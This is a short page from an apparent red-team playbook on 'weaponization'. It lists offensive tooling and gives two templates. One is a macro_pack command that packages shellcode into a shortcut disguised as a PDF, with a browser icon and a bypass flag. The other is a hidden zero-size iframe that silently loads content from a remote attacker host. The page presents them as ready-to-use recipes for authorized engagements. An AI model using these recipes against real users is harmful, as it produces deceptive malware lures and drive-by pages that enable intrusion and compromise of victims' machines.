# 2 Weaponization

## Table of Contents

- [Tooling](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2-Weaponization.md#Tooling)
- [macro_pack](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2-Weaponization.md#macro_pack)
- [Malicious iFrame](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2-Weaponization.md#Malicious-iFrame)

## Tooling

| Name | Description | URL |
| --- | --- | --- |
| macro_pack | macro_pack is a tool by @EmericNasi used to automatize obfuscation and generation of Office documents, VB scripts, shortcuts, and other formats for pentest, demo, and social engineering assessments. | https://github.com/sevagas/macro_pack |
| spoofing-office-macro | PoC of a VBA macro spawning a process with a spoofed parent and command line. | https://github.com/christophetd/spoofing-office-macro |

## macro_pack

```c
PS C:\macro_pack_pro> echo .\<FILE>.bin | marco_pack.exe -t SHELLCODE -G .\<FILE>.pdf.lnk --icon='C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13' --hta-macro --bypass
```

## Malicious iFrame

```c
<iframe src="<RHOST>" width="0" height="0" frameborder="0" tabindex="-1" title="empty" style=visibility:hidden;display:none"></iframe>
```

### Previous

- [1 Reconnaissance](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/1-Reconnaissance/1-Reconnaissance.md)
- [1.1 Scanning and Enumeration](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/1-Reconnaissance/1.1-Scanning-and-Enumeration.md)

### Next

- [2.1 Initial Access](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2.1-Initial-Access.md)
